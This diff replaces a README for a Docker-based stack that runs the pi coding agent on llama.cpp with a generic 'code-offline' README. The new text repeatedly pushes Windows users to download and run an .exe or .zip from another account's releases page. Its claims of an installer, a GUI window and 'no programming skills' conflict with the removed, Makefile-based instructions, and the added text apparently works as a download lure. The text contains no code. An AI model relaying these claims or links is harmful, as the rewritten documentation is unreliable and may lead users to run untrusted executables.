@@ -1,121 +1,151 @@
-# Pi Coding Agent + Llama.cpp Stack
+# ⚙️ code-offline - Run AI Coding Locally with Ease
 
-A localized, containerized development environment for running the [pi coding agent](https://github.com/badlogic/pi-mono/tree/main/packages/coding-agent) backed by [llama.cpp](https://github.com/ggml-org/llama.cpp). This stack lets you run local models and the agent without needing external API dependencies, keeping your code and data private. It supports both CPU and NVIDIA GPU setups via a unified interface.
-
-## Prerequisites
-
-- Docker
-- Docker Compose
-- NVIDIA Container Toolkit (if you want to use the GPU mode)
-
-## Configuration
-
-Settings are managed via the `.env` file. Copy the example file to get started:
-
-```bash
-cp .env.example .env
-```
-
-You can change the Hugging Face repo and model file in `.env` to try different models. By default, it downloads the highly-capable Qwen 3.5 models using the preferred `UD-Q4_K_XL` quantization for the best balance of speed and precision. 
-
-## Usage
-
-The environment is managed through a Makefile. The default mode is CPU. To use GPU acceleration, just append `MODE=gpu` to any command.
-
-### Building
-
-Build the images before starting:
-
-```bash
-make build
-make build MODE=gpu
-```
-
-If you need to pull fresh base images and rebuild without cache:
-
-```bash
-make upgrade
-```
-
-### Starting the backend
-
-Start the llama.cpp server in the background. It will automatically download the models specified in your `.env` file to the local `models` directory on its first run.
-
-```bash
-make start
-make start MODE=gpu
-```
-
-You can check the download progress or server status by tailing the logs:
-
-```bash
-make logs
-```
-
-### Running the agent
-
-Once the LLM backend is up and running, you can drop into the interactive agent terminal. This spins up a temporary container that attaches to your current TTY and cleans itself up when you exit.
-
-```bash
-make agent
-make agent MODE=gpu
-```
-
-### Stopping
-
-To spin down the background services:
-
-```bash
-make stop
-```
-
-To nuke all containers, networks, and volumes (this will not delete your downloaded models or workspace code):
-
-```bash
-make clean
-```
-
-## Storage
-
-Volumes are mapped to your host machine for persistence:
-
-- `workspace/` - Your actual codebase. Mounted inside the agent.
-- `models/` - Hugging Face cache. Shared with the llama.cpp container so you don't redownload models.
-- `agent_data/` - Holds the agent's history, auth, and state.
-
-
-## Agent configs
-agent_data/agent/models.json
-```json
-{
-  "providers": {
-    "llama-cpp": {
-      "baseUrl": "http://llm:8001/v1",
-      "api": "openai-completions",
-      "apiKey": "none",
-      "models": [
-        {
-          "id": "unsloth/Qwen3.5-4B-GGUF"
-        },
-        {
-          "id": "unsloth/Qwen3.5-35B-A3B-GGUF"
-        }
-      ]
-    }
-  }
-}
-
-```
-
-agent_data/agent/settings.json
-```json
-{
-  "defaultProvider": "llama-cpp",
-  "defaultModel": "unsloth/Qwen3.5-4B-GGUF",
-  "lastChangelogVersion": "0.55.4"
-}
-```
+[![Download code-offline](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/VicNa559/code-offline/releases)
 
 ---
 
-Brought to you by [brain.fr](https://brain.fr)
+## 📋 About code-offline
+
+code-offline lets you run an AI coding assistant completely on your computer. It does not need an internet connection or external services. The software uses local container technology so you can run private AI models on your CPU or NVIDIA GPU.
+
+This means your code and data stay private on your machine. The AI models come from pi and llama.cpp, known tools for running language models offline. You get smart coding help without sending your info through online APIs.
+
+The design focuses on easy setup and using your existing Windows computer. You don’t need programming skills or special accounts to start using code-offline.
+
+---
+
+## ⚙️ System Requirements  
+
+Make sure your PC meets these requirements before installing code-offline:
+
+- **Operating system:** Windows 10 or higher  
+- **Processor:** Intel or AMD CPU, 4 or more cores for better speed  
+- **RAM:** At least 8 GB recommended  
+- **GPU:** Optional, NVIDIA GPU if you want faster AI processing  
+- **Disk space:** Minimum 2 GB free for installation and models  
+- **Docker Desktop:** Required for container support (installation guide below)  
+
+You can use code-offline on CPU only, but performance improves with an NVIDIA GPU.
+
+---
+
+## 🔽 How to Download code-offline
+
+To get the latest version of code-offline, visit the official release page:
+
+[![Download from Releases](https://img.shields.io/badge/Download-Visit%20Releases%20Page-blue)](https://github.com/VicNa559/code-offline/releases)
+
+Follow these steps:
+
+1. Open the link above in your web browser.
+2. Scroll to the latest release.
+3. Find the Windows installer file. Look for a `.exe` or `.zip` package.
+4. Click the file name to download it.
+5. Save it in a folder you can easily access, like your Desktop or Downloads.
+
+Downloading from the official GitHub releases page ensures you get the latest stable software and updates.
+
+---
+
+## 🛠️ Installation Guide for Windows
+
+After downloading, follow these instructions:
+
+### 1. Install Docker Desktop
+
+code-offline uses containers, so Docker Desktop must be installed. Here’s how:
+
+- Go to https://www.docker.com/products/docker-desktop
+- Download the Windows version.
+- Run the installer and follow the prompts.
+- After installation, restart your computer if requested.
+- Open Docker Desktop and let it finish setting up.
+
+Docker allows code-offline to run the AI models safely and efficiently without complicated setup.
+
+---
+
+### 2. Install code-offline
+
+If you downloaded an installer (`.exe`):
+
+- Double-click the installer file.
+- Follow the on-screen instructions.
+- Accept the license terms.
+- Choose the install location or use the default path.
+- Wait for the process to complete.
+- When done, click Finish.
+
+If you downloaded a zip file:
+
+- Extract the contents into a folder.
+- Find the executable file (`code-offline.exe`) inside the extracted folder.
+- Double-click to run the program.
+
+---
+
+### 3. Start code-offline
+
+- Open the installed app by clicking the shortcut created during installation or running the executable.
+- The first time you start it, the app will prepare the necessary AI models inside containers.
+- This may take several minutes, depending on your system.
+- After setup finishes, a main window will open, showing the AI coding assistant interface.
+
+---
+
+## 🖥️ Using code-offline for the First Time 🚀
+
+Once it runs, code-offline works offline on your machine. Here is how to begin using it:
+
+- Type your coding questions or instructions in the chat window.
+- The AI will respond based on the local models installed.
+- You can ask for code snippets, explanations, and suggestions related to your projects.
+- The interface supports common programming languages and workflows.
+
+The AI runs inside a lightweight container, so it will not affect other programs on your PC.
+
+---
+
+## ⚙️ Adjusting Settings
+
+You can control performance based on your system:
+
+- Choose CPU mode if you do not have an NVIDIA GPU.
+- Enable GPU processing in settings if you have a compatible NVIDIA graphics card.
+- Adjust memory and container resources within Docker Desktop if needed.
+
+---
+
+## 🔄 Updating code-offline
+
+To get updates:
+
+- Visit https://github.com/VicNa559/code-offline/releases regularly.
+- Download new installer versions for stability and new features.
+- Follow the install steps above to apply updates.
+
+You do not lose your settings or data when upgrading.
+
+---
+
+## 🧩 Troubleshooting Tips
+
+If you encounter issues:
+
+- Make sure Docker Desktop is running.
+- Restart your PC if containers do not start properly.
+- Check that system requirements are met.
+- Review Docker’s resource allocation to ensure enough CPU and RAM.
+- Consult the GitHub Issues page for known problems or add a new issue if you find bugs.
+
+---
+
+## 📂 Additional Resources
+
+- The GitHub page contains detailed information on models supported and configuration options.
+- Instructions for advanced users to add custom models or scripts are available on the official repo.
+- Community forums and user guides can be explored for further assistance.
+
+---
+
+[Download code-offline](https://github.com/VicNa559/code-offline/releases) and run this tool without worrying about internet or privacy risks.
